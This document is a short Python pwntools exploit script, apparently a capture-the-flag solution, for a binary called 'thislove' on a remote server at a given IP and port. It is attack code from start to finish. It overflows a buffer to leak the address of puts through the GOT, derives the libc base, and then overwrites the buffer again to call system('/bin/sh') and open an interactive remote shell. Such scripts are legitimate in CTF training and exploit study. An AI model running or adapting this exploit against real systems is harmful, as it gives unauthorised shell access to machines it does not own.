from pwn import *

debug = False

def write(size, payload):
    print(io.recvuntil('choice: '))
    io.sendline('1')
    print(io.recv())
    io.sendline(str(size))
    print(io.recv())
    io.sendline(payload)

def execute():
    print(io.recvuntil('choice: '))
    io.sendline('2')

elf = ELF('./thislove')
if debug:
    io = process('./thislove')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    io = remote('128.199.234.122', 4900)
    libc = ELF('libc.so')

write(6, 'AAAA')
payload = b'A'*32+p64(elf.sym['puts'])+p64(elf.got['puts'])
write(100000, payload)
execute()
libc.address = u64(io.recv(6)+b'\0\0')-libc.sym['puts']
print('LIBC: ', hex(libc.address))
payload = b'A'*64+p64(libc.sym['system'])+p64(next(libc.search(b'/bin/sh')))
write(100000, payload)
execute()
io.interactive()
